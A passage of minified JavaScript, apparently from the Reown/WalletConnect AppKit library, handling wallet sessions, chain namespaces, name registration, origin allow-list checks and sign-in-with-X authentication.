r,i;if(e!==((r=this.session)==null?void 0:r.topic))return;const{namespaces:s}=n,o=(i=this.client)==null?void 0:i.session.get(e);this.session=X3(kv({},o),{namespaces:s}),this.onSessionUpdate(),this.events.emit("session_update",{topic:e,params:n})}),this.client.on("session_delete",async e=>{var n;e.topic===((n=this.session)==null?void 0:n.topic)&&(await this.cleanup(),this.events.emit("session_delete",e),this.events.emit("disconnect",X3(kv({},Ur("USER_DISCONNECTED")),{data:e.topic})))}),this.on(zB.DEFAULT_CHAIN_CHANGED,e=>{this.onChainChanged(X3(kv({},e),{internal:!0}))})}getProvider(e){return this.rpcProviders[e]||this.rpcProviders[fae]}onSessionUpdate(){Object.keys(this.rpcProviders).forEach(e=>{var n;this.getProvider(e).updateNamespace((n=this.session)==null?void 0:n.namespaces[e])})}setNamespaces(e){const{namespaces:n={},optionalNamespaces:r={},sessionProperties:i,scopedProperties:s}=e;this.optionalNamespaces=J3(n,r),this.sessionProperties=i,this.scopedProperties=s}validateChain(e){const[n,r]=e?.split(":")||["",""];if(!this.namespaces||!Object.keys(this.namespaces).length)return[n,r];if(n&&!Object.keys(this.namespaces||{}).map(o=>qb(o)).includes(n))throw new Error(`Namespace '${n}' is not configured. Please call connect() first with namespace config.`);if(n&&r)return[n,r];const i=qb(Object.keys(this.namespaces)[0]),s=this.rpcProviders[i].getDefaultChain();return[i,s]}async requestAccounts(){const[e]=this.validateChain();return await this.getProvider(e).requestAccounts()}async onChainChanged({currentCaipChainId:e,previousCaipChainId:n,internal:r=!1}){if(!this.namespaces)return;const[i,s]=this.validateChain(e);s&&(this.updateNamespaceChain(i,s),r?(this.events.emit("chainChanged",s),this.emitAccountsChangedOnChainChange({namespace:i,currentCaipChainId:e,previousCaipChainId:n})):this.getProvider(i).setDefaultChain(s),await this.persist("namespaces",this.namespaces))}emitAccountsChangedOnChainChange({namespace:e,currentCaipChainId:n,previousCaipChainId:r}){var i,s;try{if(r===n)return;const o=(s=(i=this.session)==null?void 0:i.namespaces[e])==null?void 0:s.accounts;if(!o)return;const a=o.filter(c=>c.includes(`${n}:`)).map(kV);if(!Cf(a))return;this.events.emit("accountsChanged",a)}catch(o){this.logger.warn(o,"Failed to emit accountsChanged on chain change")}}updateNamespaceChain(e,n){if(!this.namespaces)return;const r=this.namespaces[e]?e:`${e}:${n}`,i={chains:[],methods:[],events:[],defaultChain:n};this.namespaces[r]?this.namespaces[r]&&(this.namespaces[r].defaultChain=n):this.namespaces[r]=i}onConnect(){this.createProviders(),this.events.emit("connect",{session:this.session})}async cleanup(){this.connectParams=void 0,this.namespaces=void 0,this.optionalNamespaces=void 0,this.sessionProperties=void 0,await this.deleteFromStore("namespaces"),await this.deleteFromStore("optionalNamespaces"),await this.deleteFromStore("sessionProperties"),this.session=void 0,this.cleanupPendingPairings({deletePairings:!0}),await this.cleanupStorage()}async persist(e,n){var r;const i=((r=this.session)==null?void 0:r.topic)||"";await this.client.core.storage.setItem(`${Y3}/${e}${i}`,n)}async getFromStore(e){var n;const r=((n=this.session)==null?void 0:n.topic)||"";return await this.client.core.storage.getItem(`${Y3}/${e}${r}`)}async deleteFromStore(e){var n;const r=((n=this.session)==null?void 0:n.topic)||"";await this.client.core.storage.removeItem(`${Y3}/${e}${r}`)}async cleanupStorage(){var e;try{if(((e=this.client)==null?void 0:e.session.length)>0)return;const n=await this.client.core.storage.getKeys();for(const r of n)r.startsWith(Y3)&&await this.client.core.storage.removeItem(r)}catch(n){this.logger.warn(n,"Failed to cleanup storage")}}};const qV=2147483648,HNe={convertEVMChainIdToCoinType(t){if(t>=qV)throw new Error("Invalid chainId");return(qV|t)>>>0}},Ac=ar({suggestions:[],loading:!1}),zNe={state:Ac,subscribe(t){return ji(Ac,()=>t(Ac))},subscribeKey(t,e){return Mi(Ac,t,e)},async resolveName(t){try{return await Bt.lookupEnsName(t)}catch(e){const n=e;throw new Error(n?.reasons?.[0]?.description||"Error resolving name")}},async isNameRegistered(t){try{return await Bt.lookupEnsName(t),!0}catch{return!1}},async getSuggestions(t){try{Ac.loading=!0,Ac.suggestions=[];const e=await Bt.getEnsNameSuggestions(t);return Ac.suggestions=e.suggestions||[],Ac.suggestions}catch(e){const n=lE.parseEnsApiError(e,"Error fetching name suggestions");throw new Error(n)}finally{Ac.loading=!1}},async getNamesForAddress(t){try{if(!Y.state.activeCaipNetwork)return[];const n=Be.getEnsFromCacheForAddress(t);if(n)return n;const r=await Bt.reverseLookupEnsName({address:t});return Be.updateEnsCache({address:t,ens:r,timestamp:Date.now()}),r}catch(e){const n=lE.parseEnsApiError(e,"Error fetching names for address");throw new Error(n)}},async registerName(t){const e=Y.state.activeCaipNetwork,n=Y.getAccountData(e?.chainNamespace)?.address,r=Ce.getAuthConnector();if(!e)throw new Error("Network not found");if(!n||!r)throw new Error("Address or auth connector not found");Ac.loading=!0;try{const i=JSON.stringify({name:t,attributes:{},timestamp:Math.floor(Date.now()/1e3)});we.pushTransactionStack({onCancel(){we.replace("RegisterAccountName")}});const s=await ke.signMessage(i);Ac.loading=!1;const o=e.id;if(!o)throw new Error("Network not found");const a=HNe.convertEVMChainIdToCoinType(Number(o));await Bt.registerEnsName({coinType:a,address:n,signature:s,message:i}),Y.setAccountProp("profileName",t,e.chainNamespace),Be.updateEnsCache({address:n,ens:[{name:t,registered_at:new Date().toISOString(),updated_at:void 0,addresses:{},attributes:[]}],timestamp:Date.now()}),we.replace("RegisterAccountNameSuccess")}catch(i){const s=lE.parseEnsApiError(i,`Error registering name ${t}`);throw we.replace("RegisterAccountName"),new Error(s)}finally{Ac.loading=!1}},validateName(t){return/^[a-zA-Z0-9-]{4,}$/u.test(t)},parseEnsApiError(t,e){return t?.reasons?.[0]?.description||e}},lE=ec(zNe);function D7(t){try{return new URL(t)}catch{return null}}function qNe(t){const e=t.split("/"),n=e.length>0&&e[0]!==void 0?e[0]:"",r=n.lastIndexOf(":");return r===-1?{host:n}:{host:n.slice(0,r),port:n.slice(r+1)}}function VNe(t){const e=t.indexOf("://");if(e===-1)return null;const n=t.slice(0,e),r=e+3;let i=t.indexOf("/",r);i===-1&&(i=t.length);const s=t.slice(r,i),o=s.lastIndexOf(":");return o===-1?{scheme:n,host:s}:{scheme:n,host:s.slice(0,o),port:s.slice(o+1)}}function WNe(t,e){if(e.includes("://")){const o=D7(e);return o?o.origin===t:!1}const{host:n,port:r}=qNe(e),i=t.indexOf("://");if(i!==-1){const o=i+3;let a=t.indexOf("/",o);a===-1&&(a=t.length);const c=t.slice(o,a);if(r!==void 0)return`${n}:${r}`===c;const l=c.split(":")[0];return n===l}const s=D7(t);return s?r!==void 0?n===s.hostname&&r===(s.port||void 0):n===s.hostname:!1}function GNe(t,e,n){let r=n,i;const s=r.indexOf("://");s!==-1&&(i=r.slice(0,s),r=r.slice(s+3));const o=r.indexOf("/");o!==-1&&(r=r.slice(0,o));let a=r,c;const l=a.lastIndexOf(":");l!==-1&&(c=a.slice(l+1),a=a.slice(0,l));const f=a.split(".");for(const y of f)if(y.includes("*")&&y!=="*")return!1;const h=t.protocol.replace(/:$/u,"");if(i&&i!==h||c!==void 0&&c!=="*"&&c!==t.port)return!1;const m=VNe(e),w=(m?m.host:t.hostname).split(".");if(f.length!==w.length)return!1;for(let y=f.length-1;y>=0;y-=1){const E=f[y],A=w[y];if(E!=="*"&&E!==A)return!1}return!0}const KNe={ton:["ton_sendMessage","ton_signData"],solana:["solana_signMessage","solana_signTransaction","solana_requestAccounts","solana_getAccounts","solana_signAllTransactions","solana_signAndSendTransaction"],eip155:["eth_accounts","eth_requestAccounts","eth_sendRawTransaction","eth_sign","eth_signTransaction","eth_signTypedData","eth_signTypedData_v3","eth_signTypedData_v4","eth_sendTransaction","personal_sign","wallet_switchEthereumChain","wallet_addEthereumChain","wallet_getPermissions","wallet_requestPermissions","wallet_registerOnboarding","wallet_watchAsset","wallet_scanQRCode","wallet_getCallsStatus","wallet_showCallsStatus","wallet_sendCalls","wallet_getCapabilities","wallet_grantPermissions","wallet_revokePermissions","wallet_getAssets"],bip122:["sendTransfer","signMessage","signPsbt","getAccountAddresses"]},$l={RPC_ERROR_CODE:{USER_REJECTED:5e3,USER_REJECTED_METHODS:5002},getMethodsByChainNamespace(t){return KNe[t]||[]},createDefaultNamespace(t){return{methods:this.getMethodsByChainNamespace(t),events:["accountsChanged","chainChanged"],chains:[],rpcMap:{}}},applyNamespaceOverrides(t,e){if(!e)return{...t};const n={...t},r=new Set;if(e.methods&&Object.keys(e.methods).forEach(i=>r.add(i)),e.chains&&Object.keys(e.chains).forEach(i=>r.add(i)),e.events&&Object.keys(e.events).forEach(i=>r.add(i)),e.rpcMap&&Object.keys(e.rpcMap).forEach(i=>{const[s]=i.split(":");s&&r.add(s)}),r.forEach(i=>{n[i]||(n[i]=this.createDefaultNamespace(i))}),e.methods&&Object.entries(e.methods).forEach(([i,s])=>{n[i]&&(n[i].methods=s)}),e.chains&&Object.entries(e.chains).forEach(([i,s])=>{n[i]&&(n[i].chains=s)}),e.events&&Object.entries(e.events).forEach(([i,s])=>{n[i]&&(n[i].events=s)}),e.rpcMap){const i=new Set;Object.entries(e.rpcMap).forEach(([s,o])=>{const[a,c]=s.split(":");!a||!c||!n[a]||(n[a].rpcMap||(n[a].rpcMap={}),i.has(a)||(n[a].rpcMap={},i.add(a)),n[a].rpcMap[c]=o)})}return n},createNamespaces(t,e){const n=t.reduce((r,i)=>{const{id:s,chainNamespace:o,rpcUrls:a}=i,c=a.default.http[0];r[o]||(r[o]=this.createDefaultNamespace(o));const l=`${o}:${s}`,f=r[o];switch(f.chains.push(l),l){case"solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp":f.chains.push("solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ");break;case"solana:EtWTRABZaYq6iMfeYKouRu166VU2xqa1":f.chains.push("solana:8E9rvCKLFQia2Y35HXjjpWzj8weVo44K");break}return f?.rpcMap&&c&&(f.rpcMap[s]=c),r},{});return this.applyNamespaceOverrides(n,e)},resolveReownName:async t=>{const e=await lE.resolveName(t);return(e?.addresses?Object.values(e.addresses):[])[0]?.address||!1},getChainsFromNamespaces(t={}){return Object.values(t).flatMap(e=>{const n=e.chains||[],r=e.accounts.map(i=>{const[s,o]=i.split(":");return`${s}:${o}`});return Array.from(new Set([...n,...r]))})},isSessionEventData(t){return typeof t=="object"&&t!==null&&"id"in t&&"topic"in t&&"params"in t&&typeof t.params=="object"&&t.params!==null&&"chainId"in t.params&&"event"in t.params&&typeof t.params.event=="object"&&t.params.event!==null},isUserRejectedRequestError(t){try{if(typeof t=="object"&&t!==null){const e=t,n=typeof e.code=="number",r=n&&e.code===$l.RPC_ERROR_CODE.USER_REJECTED_METHODS,i=n&&e.code===$l.RPC_ERROR_CODE.USER_REJECTED;return r||i}return!1}catch{return!1}},isOriginAllowed(t,e,n){const r=[...e,...n];if(e.length===0)return!0;const i=D7(t);if(!i)return r.some(s=>!s.includes("*")&&s===t);if(i.hostname==="localhost"||i.hostname==="127.0.0.1")return!0;for(const s of r)if(s.includes("*")){if(GNe(i,t,s))return!0}else if(WNe(t,s))return!0;return!1},listenWcProvider({universalProvider:t,namespace:e,onConnect:n,onDisconnect:r,onAccountsChanged:i,onChainChanged:s,onDisplayUri:o}){n&&t.on("connect",()=>{const a=$l.getWalletConnectAccounts(t,e);n(a)}),r&&t.on("disconnect",()=>{r()}),i&&t.on("accountsChanged",a=>{try{const c=t.session?.namespaces?.[e]?.accounts||[],l=t.rpcProviders?.[e]?.getDefaultChain(),f=a.map(h=>{const m=c.find(y=>y.includes(`${e}:${l}:${h}`));if(!m)return;const{chainId:b,chainNamespace:w}=gi.parseCaipAddress(m);return{address:h,chainId:b,chainNamespace:w}}).filter(h=>h!==void 0);f.length>0&&i(f)}catch(c){console.warn("Failed to parse accounts for namespace on accountsChanged event",e,a,c)}}),s&&t.on("chainChanged",a=>{s(a)}),o&&t.on("display_uri",a=>{o(a)})},getWalletConnectAccounts(t,e){const n=new Set,r=t?.session?.namespaces?.[e]?.accounts?.map(i=>gi.parseCaipAddress(i)).filter(({address:i})=>n.has(i.toLowerCase())?!1:(n.add(i.toLowerCase()),!0));return r&&r.length>0?r:[]}},ZNe=[ge.CONNECTOR_ID.AUTH,ge.CONNECTOR_ID.WALLET_CONNECT];class bae{constructor(e){this.availableConnectors=[],this.availableConnections=[],this.providerHandlers={},this.eventListeners=new Map,this.getCaipNetworks=n=>Y.getCaipNetworks(n),this.getConnectorId=n=>Ce.getConnectorId(n),e&&this.construct(e)}construct(e){this.projectId=e.projectId,this.namespace=e.namespace,this.adapterType=e.adapterType}get connectors(){return this.availableConnectors}get connections(){return this.availableConnections}get networks(){return this.getCaipNetworks(this.namespace)}onAuthConnected({accounts:e,chainId:n}){const r=this.getCaipNetworks().filter(i=>i.chainNamespace===this.namespace).find(i=>i.id.toString()===n?.toString());e&&r&&this.addConnection({connectorId:ge.CONNECTOR_ID.AUTH,accounts:e,caipNetwork:r})}setAuthProvider(e){e.onConnect(this.onAuthConnected.bind(this)),e.onSocialConnected(this.onAuthConnected.bind(this)),this.addConnector({id:ge.CONNECTOR_ID.AUTH,type:"AUTH",name:ge.CONNECTOR_NAMES.AUTH,provider:e,imageId:void 0,chain:this.namespace,chains:[]})}addConnector(...e){const n=new Set;this.availableConnectors=[...e,...this.availableConnectors].filter(r=>n.has(r.id)?!1:(n.add(r.id),!0)),this.emit("connectors",this.availableConnectors)}addConnection(...e){const n=new Set;this.availableConnections=[...e,...this.availableConnections].filter(r=>n.has(r.connectorId.toLowerCase())?!1:(n.add(r.connectorId.toLowerCase()),!0)),this.emit("connections",this.availableConnections)}deleteConnection(e){this.availableConnections=this.availableConnections.filter(n=>n.connectorId.toLowerCase()!==e.toLowerCase()),this.emit("connections",this.availableConnections)}clearConnections(e=!1){this.availableConnections=[],e&&this.emit("connections",this.availableConnections)}setStatus(e,n){Y.setAccountProp("status",e,n)}on(e,n){this.eventListeners.has(e)||this.eventListeners.set(e,new Set),this.eventListeners.get(e)?.add(n)}off(e,n){const r=this.eventListeners.get(e);r&&r.delete(n)}removeAllEventListeners(){this.eventListeners.forEach(e=>{e.clear()})}emit(e,n){const r=this.eventListeners.get(e);r&&r.forEach(i=>i(n))}async connectWalletConnect(e){try{return{clientId:(await this.getWalletConnectConnector().connectWalletConnect()).clientId}}catch(n){throw $l.isUserRejectedRequestError(n)?new JD(n):n}}async switchNetwork(e){const{caipNetwork:n}=e,r=Rn.getProviderId(n.chainNamespace),i=Rn.getProvider(n.chainNamespace);if(!i)throw new Error("Provider not found");if(r==="WALLET_CONNECT"){i.setDefaultChain(n.caipNetworkId);return}if(r==="AUTH"){const s=Ce.getAuthConnector()?.provider;if(!s)throw new Error("Auth provider not found");const o=Zr(n.chainNamespace);await s.switchNetwork({chainId:n.caipNetworkId});const a=await s.getUser({chainId:n.caipNetworkId,preferredAccountType:o});this.emit("switchNetwork",a)}}getWalletConnectConnector(){const e=this.connectors.find(n=>n.id==="walletConnect");if(!e)throw new Error("WalletConnectConnector not found");return e}onConnect(e,n){if(e.length>0){const{address:r,chainId:i}=xe.getAccount(e[0]),s=this.getCaipNetworks().filter(a=>a.chainNamespace===this.namespace).find(a=>a.id.toString()===i?.toString()),o=this.connectors.find(a=>a.id===n);r&&(this.emit("accountChanged",{address:r,chainId:i,connector:o}),this.addConnection({connectorId:n,accounts:e.map(a=>{const{address:c}=xe.getAccount(a);return{address:c}}),caipNetwork:s}))}}onAccountsChanged(e,n,r=!0){if(e.length>0){const{address:i}=xe.getAccount(e[0]),s=this.getConnection({connectorId:n,connections:this.connections,connectors:this.connectors});i&&this.getConnectorId(ge.CHAIN.EVM)?.toLowerCase()===n.toLowerCase()&&this.emit("accountChanged",{address:i,chainId:s?.caipNetwork?.id,connector:s?.connector}),this.addConnection({connectorId:n,accounts:e.map(o=>{const{address:a}=xe.getAccount(o);return{address:a}}),caipNetwork:s?.caipNetwork})}else r&&this.onDisconnect(n)}onDisconnect(e){this.removeProviderListeners(e),this.deleteConnection(e),this.getConnectorId(ge.CHAIN.EVM)?.toLowerCase()===e.toLowerCase()&&this.emitFirstAvailableConnection(),this.connections.length===0&&this.emit("disconnect")}onChainChanged(e,n){const r=typeof e=="string"&&e.startsWith("0x")?parseInt(e,16).toString():e.toString(),i=this.getConnection({connectorId:n,connections:this.connections,connectors:this.connectors}),s=this.getCaipNetworks().filter(o=>o.chainNamespace===this.namespace).find(o=>o.id.toString()===r);i&&this.addConnection({connectorId:n,accounts:i.accounts,caipNetwork:s}),this.getConnectorId(ge.CHAIN.EVM)?.toLowerCase()===n.toLowerCase()&&this.emit("switchNetwork",{chainId:r})}listenProviderEvents(e,n){if(ZNe.includes(e))return;const r=o=>this.onAccountsChanged(o,e),i=o=>this.onChainChanged(o,e),s=()=>this.onDisconnect(e);this.providerHandlers[e]||(n.on("disconnect",s),n.on("accountsChanged",r),n.on("chainChanged",i),this.providerHandlers[e]={provider:n,disconnect:s,accountsChanged:r,chainChanged:i})}removeProviderListeners(e){if(this.providerHandlers[e]){const{provider:n,disconnect:r,accountsChanged:i,chainChanged:s}=this.providerHandlers[e];n.removeListener("disconnect",r),n.removeListener("accountsChanged",i),n.removeListener("chainChanged",s),this.providerHandlers[e]=null}}emitFirstAvailableConnection(){const e=this.getConnection({connections:this.connections,connectors:this.connectors});if(e){const[n]=e.accounts;this.emit("accountChanged",{address:n?.address,chainId:e.caipNetwork?.id,connector:e.connector})}}getConnection({address:e,connectorId:n,connections:r,connectors:i}){if(n){const o=r.find(l=>l.connectorId.toLowerCase()===n.toLowerCase());if(!o)return null;const a=i.find(l=>l.id.toLowerCase()===o.connectorId.toLowerCase()),c=e?o.accounts.find(l=>l.address.toLowerCase()===e.toLowerCase()):o.accounts[0];return{...o,account:c,connector:a}}const s=r.find(o=>o.accounts.length>0&&i.some(a=>a.id.toLowerCase()===o.connectorId.toLowerCase()));if(s){const[o]=s.accounts,a=i.find(c=>c.id.toLowerCase()===s.connectorId.toLowerCase());return{...s,account:o,connector:a}}return null}}let Q0=null;const As={getSIWX(){return de.state.siwx},async initializeIfEnabled(t=Y.getActiveCaipAddress()){const e=de.state.siwx;if(!(e&&t))return;const[n,r,i]=t.split(":");if(Y.checkIfSupportedNetwork(n,`${n}:${r}`))try{if(de.state.remoteFeatures?.emailCapture){const o=Y.getAccountData(n)?.user;await kt.open({view:"DataCapture",data:{email:o?.email??void 0}});return}if(Q0&&await Q0,(await e.getSessions(`${n}:${r}`,i)).length)return;await kt.open({view:"SIWXSignMessage"})}catch(s){console.error("SIWXUtil:initializeIfEnabled",s),tt.sendEvent({type:"track",event:"SIWX_AUTH_ERROR",properties:this.getSIWXEventProperties(s)}),await ke._getClient()?.disconnect().catch(console.error),we.reset("Connect"),on.showError("A problem occurred while trying initialize authentication")}},async isAuthenticated(t=Y.getActiveCaipAddress()){if(!de.state.siwx||!t)return!0;const{chainNamespace:n,chainId:r,address:i}=gi.parseCaipAddress(t),s=`${n}:${r}`;return(await As.getSessions({address:i,caipNetworkId:s})).length>0},async requestSignMessage(){const t=de.state.siwx,e=xe.getPlainAddress(Y.getActiveCaipAddress()),n=V2();if(!t)throw new Error("SIWX is not enabled");if(!e)throw new Error("No ActiveCaipAddress found");if(!n)throw new Error("No ActiveCaipNetwork or client found");try{const r=await t.createMessage({chainId:n.caipNetworkId,accountAddress:e}),i=r.toString();let s="";t.signMessage?s=await t.signMessage({message:i,chainId:n.caipNetworkId,accountAddress:e}):(Ce.getConnectorId(n.chainNamespace)===ge.CONNECTOR_ID.AUTH&&we.pushTransactionStack({}),s=await ke.signMessage(i)||""),await t.addSession({data:r,message:i,signature:s}),Y.setLastConnectedSIWECaipNetwork(n),kt.close(),tt.sendEvent({type:"track",event:"SIWX_AUTH_SUCCESS",properties:this.getSIWXEventProperties()})}catch(r){(!kt.state.open||we.state.view==="ApproveTransaction")&&await kt.open({view:"SIWXSignMessage"}),on.showError("Error signing message"),tt.sendEvent({type:"track",event:"SIWX_AUTH_ERROR",properties:this.getSIWXEventProperties(r)}),console.error("SWIXUtil:requestSignMessage",r)}},async cancelSignMessage(){try{const t=this.getSIWX();if(t?.getRequired?.()){const n=Y.getLastConnectedSIWECaipNetwork();if(n){const r=await t?.getSessions(n?.caipNetworkId,xe.getPlainAddress(Y.getActiveCaipAddress())||"");r&&r.length>0?await Y.switchActiveNetwork(n):await ke.disconnect()}else await ke.disconnect()}else kt.close();kt.close(),tt.sendEvent({event:"CLICK_CANCEL_SIWX",type:"track",properties:this.getSIWXEventProperties()})}catch(t){console.error("SIWXUtil:cancelSignMessage",t)}},async getAllSessions(){const t=this.getSIWX(),e=Y.getAllRequestedCaipNetworks(),n=[];return await Promise.all(e.map(async r=>{const i=await t?.getSessions(r.caipNetworkId,xe.getPlainAddress(Y.getActiveCaipAddress())||"");i&&n.push(...i)})),n},async getSessions(t){const e=de.state.siwx;let n=t?.address;if(!n){const i=Y.getActiveCaipAddress();n=xe.getPlainAddress(i)}let r=t?.caipNetworkId;return r||(r=Y.getActiveCaipNetwork()?.caipNetworkId),e&&n&&r?e.getSessions(r,n):[]},async isSIWXCloseDisabled(){const t=this.getSIWX();if(t){const e=we.state.view==="ApproveTransaction",n=we.state.view==="SIWXSignMessage";if(e||n)return t.getRequired?.()&&(await this.getSessions()).length===0}return!1},async authConnectorAuthenticate({authConnector:t,chainId:e,socialUri:n,preferredAccountType:r,chainNamespace:i}){const s=As.getSIWX(),o=V2();if(!s||!i.includes(ge.CHAIN.EVM)||de.state.remoteFeatures?.emailCapture){const h=await t.connect({chainId:e,socialUri:n,preferredAccountType:r});return{address:h.address,chainId:h.chainId,accounts:h.accounts}}const a=`${i}:${e}`,c=await s.createMessage({chainId:a,accountAddress:"<<AccountAddress>>"}),l={accountAddress:c.accountAddress,chainId:c.chainId,domain:c.domain,uri:c.uri,version:c.version,nonce:c.nonce,notBefore:c.notBefore,statement:c.statement,resources:c.resources,requestId:c.requestId,issuedAt:c.issuedAt,expirationTime:c.expirationTime,serializedMessage:c.toString()},f=await t.connect({chainId:e,socialUri:n,siwxMessage:l,preferredAccountType:r});return l.accountAddress=f.address,l.serializedMessage=f.message||"",f.signature&&f.message&&await As.addEmbeddedWalletSession(l,f.message,f.signature),Y.setLastConnectedSIWECaipNetwork(o),{address:f.address,chainId:f.chainId,accounts:f.accounts}},async addEmbeddedWalletSession(t,e,n){if(Q0)return Q0;const r=As.getSIWX();return r?(Q0=r.addSession({data:t,message:e,signature:n}).finally(()=>{Q0=null}),Q0):Promise.resolve()},async universalProviderAuthenticate({universalProvider:t,chains:e,methods:n}){const r=As.getSIWX(),i=V2(),s=new Set(e.map(l=>l.split(":")[0]));if(!r||s.size!==1||!s.has("eip155"))return!1;const o=await r.createMessage({chainId:V2()?.caipNetworkId||"",accountAddress:""}),a=await t.authenticate({nonce:o.nonce,domain:o.domain,uri:o.uri,exp:o.expirationTime,iat:o.issuedAt,nbf:o.notBefore,requestId:o.requestId,version:o.version,resources:o.resources,statement:o.statement,chainId:o.chainId,methods:n,chains:[o.chainId,...e.filter(l=>l!==o.chainId)]});on.showLoading("Authenticating...",{autoClose:!1});const c={...a.session.peer.metadata,name:a.session.peer.metadata.name,icon:a.session.peer.metadata.icons?.[0],type:"WALLET_CONNECT"};if(Y.setAccountProp("connectedWalletInfo",c,Array.from(s)[0]),a?.auths?.length){const l=a.auths.map(f=>{const h=t.client.formatAuthMessage({request:f.p,iss:f.p.iss});return{data:{...f.p,accountAddress:f.p.iss.split(":").slice(-1).join(""),chainId:f.p.iss.split(":").slice(2,4).join(":"),uri:f.p.aud??"",version:f.p.version||o.version,expirationTime:f.p.exp,issuedAt:f.p.iat,notBefore:f.p.nbf},message:h,signature:f.s.s,cacao:f}});try{await r.setSessions(l),i&&Y.setLastConnectedSIWECaipNetwork(i),tt.sendEvent({type:"track",event:"SIWX_AUTH_SUCCESS",properties:As.getSIWXEventProperties()})}catch(f){throw console.error("SIWX:universalProviderAuth - failed to set sessions",f),tt.sendEvent({type:"track",event:"SIWX_AUTH_ERROR",properties:As.getSIWXEventProperties(f)}),await t.disconnect().catch(console.error),f}finally{on.hide()}}return!0},getSIWXEventProperties(t){const e=Y.state.activeChain;if(!e)throw new Error("SIWXUtil:getSIWXEventProperties - namespace is required");return{network:Y.state.activeCaipNetwork?.caipNetworkId||"",isSmartAccount:Zr(e)===Xn.ACCOUNT_TYPES.SMART_ACCOUNT,message:t?xe.parseError(t):void 0}},async clearSessions(){const t=this.getSIWX();t&&await t.setSessions([])}};class wae{constructor({provider:e,namespace:n}){this.id=ge.CONNECTOR_ID.WALLET_CONNECT,this.name="WalletConnect",this.type="WALLET_CONNECT",this.imageId="ef1a1fcf-7fe8-4d69-bd6d-fda1345b4400",this.getCaipNetworks=Y.getCaipNetworks.bind(Y),this.caipNetworks=this.getCaipNetworks(),this.provider=e,this.chain=n}get chains(){return this.getCaipNetworks()}async connectWalletConnect(){if(!await this.authenticate()){const n=this.getCaipNetworks(),r=de.state.universalProviderConfigOverride,i=$l.createNamespaces(n,r);await this.provider.connect({optionalNamespaces:i})}return{clientId:await this.provider.client.core.crypto.getClientId(),session:this.provider.session}}async disconnect(){await this.provider.disconnect()}async authenticate(){const e=this.chains.map(n=>n.caipNetworkId);return As.universalProviderAuthenticate({universalProvider:this.provider,chains:e,methods:YNe})}}const YNe=["eth_accounts","eth_requestAccounts","eth_sendRawTransaction","eth_sign","eth_signTransaction","eth_signTypedData","eth_signTypedData_v3","eth_signTypedData_v4","eth_sendTransaction","personal_sign","wallet_switchEthereumChain","wallet_addEthereumChain","wallet_getPermissions","wallet_requestPermissions","wallet_registerOnboarding","wallet_watchAsset","wallet_scanQRCode","wallet_getCallsStatus","wallet_sendCalls","wallet_getCapabilities","wallet_grantPermissions","wallet_revokePermissions","wallet_getAssets"],pu=ar({message:"",variant:"info",open:!1}),QNe={state:pu,subscribeKey(t,e){return Mi(pu,t,e)},open(t,e){const{debug:n}=de.state,{code:r,displayMessage:i,debugMessage:s}=t;i&&n&&(pu.message=i,pu.variant=e,pu.open=!0),s&&console.error(typeof s=="function"?s():s,r?{code:r}:void 0)},warn(t,e,n){pu.open=!0,pu.message=t,pu.variant="warning",e&&console.warn(e,n)},close(){pu.open=!1,pu.message="",pu.variant="info"}},Yi=ec(QNe),mu=ar({message:"",open:!1,triggerRect:{width:0,height:0,top:0,left:0},variant:"shade"}),JNe={state:mu,subscribe(t){return ji(mu,()=>t(mu))},subscribeKey(t,e){return Mi(mu,t,e)},showTooltip({message:t,triggerRect:e,variant:n}){mu.open=!0,mu.message=t,mu.triggerRect=e,mu.variant=n},hide(){mu.open=!1,mu.message="",mu.triggerRect={width:0,height:0,top:0,left:0}}},kc=ec(JNe),Dv=ar({isLegalCheckboxChecked:!1}),Qm={state:Dv,subscribe(t){return ji(Dv,()=>t(Dv))},subscribeKey(t,e){return Mi(Dv,t,e)},setIsLegalCheckboxChecked(t){Dv.isLegalCheckboxChecked=t}},XNe={eip155:{native:{assetNamespace:"slip44",assetReference:"60"},defaultTokenNamespace:"erc20"},solana:{native:{assetNamespace:"slip44",assetReference:"501"},defaultTokenNamespace:"token"}};class e9e extends Error{}function t9e(){const{sdkType:t,sdkVersion:e,projectId:n}=de.getSnapshot(),r=new URL("https://rpc.walletconnect.org/v1/json-rpc");return r.searchParams.set("projectId",n),r.searchParams.set("st",t),r.searchParams.set("sv",e),r.searchParams.set("source","fund-wallet"),r.toString()}async function qB(t,e){const n=t9e(),{projectId:r}=de.getSnapshot(),i={jsonrpc:"2.0",id:1,method:t,params:{...e||{},projectId:r}},o=await(await fetch(n,{method:"POST",body:JSON.stringify(i),headers:{"Content-Type":"application/json"}})).json();if(o.error)throw new e9e(o.error.message);return o}async function n9e(t){return(await qB("reown_getExchanges",t)).result}async function r9e(t){return(await qB("reown_getExchangePayUrl",t)).result}async function i9e(t){return(await qB("reown_getExchangeBuyStatus",t)).result}function VV(t,e){const{chainNamespace:n,chainId:r}=gi.parseCaipNetworkId(t),i=XNe[n];if(!i)throw new Error(`Unsupported chain namespace for CAIP-19 formatting: ${n}`);let s=i.native.assetNamespace,o=i.native.assetReference;return e!=="native"&&(s=i.defaultTokenNamespace,o=e),`${`${n}:${r}`}/${s}:${o}`}const s9e={network:"eip155:1",asset:"native",metadata:{name:"Ethereum",symbol:"ETH",decimals:18}},o9e={network:"eip155:8453",asset:"native",metadata:{name:"Ethereum",symbol:"ETH",decimals:18}},vae={network:"eip155:8453",asset:"0x833589fcd6edb6e08f4c7c32d4f71b54bda02913",metadata:{name:"USD Coin",symbol:"USDC",decimals:6}},a9e={asset:"0x036CbD53842c5426634e7929541eC2318f3dCF7e"},c9e={network:"eip155:84532",asset:"native",metadata:{name:"Ethereum",symbol:"ETH",decimals:18}},u9e={network:"eip155:1",asset:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",metadata:{name:"USD Coin",symbol:"USDC",decimals:6}},l9e={network:"eip155:42161",asset:"0xaf88d065e77c8cC2239327C5EDb3A432268e5831",metadata:{name:"USD Coin",symbol:"USDC",decimals:6}},d9e={network:"eip155:137",asset:"0x2791bca1f2de4661ed88a30c99a7a9449aa84174",metadata:{name:"USD Coin",symbol:"USDC",decimals:6}},f9e={network:"solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp",asset:"EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v",metadata:{name:"USD Coin",symbol:"USDC",decimals:6}},h9e={network:"eip155:1",asset:"0xdAC17F958D2ee523a2206206994597C13D831ec7",metadata:{name:"Tether 